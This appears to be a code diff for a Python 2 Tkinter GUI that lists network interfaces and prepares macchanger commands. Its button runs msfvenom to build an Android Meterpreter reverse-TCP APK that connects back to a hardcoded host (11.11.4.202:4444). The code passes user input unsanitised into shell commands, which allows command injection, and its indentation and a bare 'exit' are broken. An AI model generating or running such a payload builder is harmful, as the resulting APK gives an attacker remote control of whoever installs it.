@@ -1,0 +1,81 @@
+import sys
+import os
+import time
+from Tkinter import *
+from tkMessageBox import *
+from tkinter import messagebox
+import tkMessageBox
+from PIL import ImageTk, Image
+import psutil
+from subprocess import Popen,PIPE,STDOUT,call
+
+root = Tk()
+root.configure(background="white")
+
+command_show = ""
+command_random = ""
+command_reset = ""
+flag=0
+
+def interface(x):
+	global flag
+	if x=="Select":
+		tkMessageBox.showinfo("Error", "Please select an Interface!!!")
+		flag = 0 	
+	else:
+		flag=1
+	iface=variable.get()
+	interface.i=iface
+	interface.command_show = 'macchanger -s ' + iface
+	interface.command_random = 'macchanger -r ' + iface
+	interface.command_reset = 'macchanger -p ' + iface
+                        
+def manually():            
+	def Change():
+		custom = E1.get()
+		
+                proc=Popen('msfvenom -p android/meterpreter/reverse_tcp lhost=11.11.4.202  lport=4444 r >'+(custom)+ ' ' + interface.i, shell=True,stdout=PIPE, )
+		tkMessageBox.showinfo("Result","Anfroid apk file is created")	
+                exit
+	if flag==0:
+		tkMessageBox.showinfo("Error", "Please select an Interface!!!")
+	else:
+		proc=Popen('ifconfig ' + interface.i + ' down', shell=True, stdout=PIPE, )
+		L2 = Label(root, text="Enter address: ")
+		L2.place(x=50,y=250)
+		L2.configure(bg="white")
+		E1 = Entry(root,bd=2,bg="thistle1")
+		E1.place(x=190,y=245)
+		submit = Button(root, text="OK", bg="pale violet red", fg="BLACK", command=Change)
+		submit.place(x=370,y=240)
+
+
+L1 = Label(root, text="Choose Interface: ")
+L1.configure(background="white")
+L1.place(x=130,y=160)
+
+newlist=['Select']
+addrs=psutil.net_if_addrs()
+mylist=(addrs.keys())
+for i in range (0,len(mylist)):
+	if mylist[i]!='lo':
+		newlist.append(mylist[i])
+
+OPTIONS = newlist
+
+variable = StringVar(root)
+variable.set(OPTIONS[0])
+
+O1 = OptionMenu(root, variable, *OPTIONS, command=interface)
+O1.configure(fg="black", bg="lightblue")
+O1.place(x=250,y=153)
+
+customlybutton = Button(root, text="Press Buttom", bg='lightblue', fg="blue",command=manually)
+customlybutton.pack()
+customlybutton.place(x= 319, y=350, anchor="c")
+
+
+
+root.geometry('487x380')
+root.title("Tkinter GUI")
+root.mainloop()
